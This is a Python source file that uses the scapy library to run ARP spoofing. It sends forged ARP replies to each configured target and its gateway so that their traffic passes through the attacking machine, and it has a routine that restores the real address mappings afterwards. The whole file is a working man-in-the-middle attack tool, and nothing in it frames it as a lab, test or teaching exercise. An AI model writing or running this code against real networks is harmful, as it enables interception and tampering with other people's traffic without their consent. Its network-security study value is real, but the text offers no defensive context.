from scapy.all import ARP, send
import logging
from scapy.all import getmacbyip

logger = logging.getLogger(__name__)

async def arp_spoof(target_ip, gateway_ip, interface):
    try:
        target_mac = getmacbyip(target_ip) or "ff:ff:ff:ff:ff:ff"
        gateway_mac = getmacbyip(gateway_ip) or "ff:ff:ff:ff:ff:ff"
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        send(packet, iface=interface, verbose=False)
        packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        send(packet, iface=interface, verbose=False)
        return True
    except Exception as e:
        logger.error(f"ARP spoofing failed for {target_ip}: {e}")
        return False

async def start_spoofing(packet, config):
    if not packet.haslayer(ARP):
        return False
    try:
        for target in config.get('targets', []):
            await arp_spoof(target['ip'], target['gateway'], config['interface'])
        return True
    except Exception as e:
        logger.error(f"Error in ARP spoofing: {e}")
        return False

async def stop_spoofing(packet, config):
    interface = config['interface']
    try:
        for target in config.get('targets', []):
            target_mac = getmacbyip(target['ip']) or "ff:ff:ff:ff:ff:ff"
            gateway_mac = getmacbyip(target['gateway']) or "ff:ff:ff:ff:ff:ff"
            packet = ARP(op=2, pdst=target['ip'], hwdst=target_mac, psrc=target['gateway'], hwsrc=gateway_mac)
            send(packet, iface=interface, count=5, verbose=False)
            packet = ARP(op=2, pdst=target['gateway'], hwdst=gateway_mac, psrc=target['ip'], hwsrc=target_mac)
            send(packet, iface=interface, count=5, verbose=False)
        logger.info("ARP spoofing stopped.")
        return True
    except Exception as e:
        logger.error(f"Error stopping ARP spoofing: {e}")
        return False
